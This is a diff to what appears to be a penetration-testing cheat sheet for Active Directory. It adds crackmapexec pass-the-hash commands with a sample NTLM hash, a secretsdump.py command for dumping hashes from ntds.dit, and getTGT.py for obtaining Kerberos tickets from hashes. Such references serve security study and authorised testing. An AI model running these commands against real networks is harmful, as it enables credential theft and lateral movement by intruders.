@@ -104,6 +104,12 @@ sudo crackmapexec <protocol> <target ip(s)> -u <username> -p <password> --shares
 sudo crackmapexec <protocol> <target ip(s)> -u <username> -p <password> -M spider_plus
 # bruteforcing the RID
 sudo crackmapexec <protocol> <target ip(s)> -u <username> -p <password> --rid-brute
+# using NTLM hash (NTDS.dit) to check credentials
+# e.g., Administrator:500:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::
+sudo crackmapexec smb <target ip(s)> -u <username> -H 'LM:NT'
+# sudo crackmapexec smb test.local -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c'
+sudo crackmapexec smb <target ip(s)> -u <username> -H 'NTHASH'
+# sudo crackmapexec smb test.local -u Administrator -H '13b29964cc2480b4ef454c59562e675c'
 ```
 
 ### :open_file_folder: [dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11))
@@ -190,7 +196,13 @@ psexec.py punipunidenki.local/administrator:'f!wef23424;'@192.168.9.100 "-e cmd.
 [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py): extracting the password hash from ntds.dit
 
 ```shell
-/secretsdump.py -ntds /tmp/ntds.dit -system /tmp/SYSTEM local -outputfile /tmp/ADHashes.txt
+secretsdump.py -ntds /tmp/ntds.dit -system /tmp/SYSTEM local -outputfile /tmp/ADHashes.txt
+```
+
+[getTGT.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py):get a Kerberos ticket and use it to access other services
+
+```shell
+getTGT.py -hashes <lm:nt> <domain>/<user>
 ```
 
 ### :open_file_folder: Test Environment
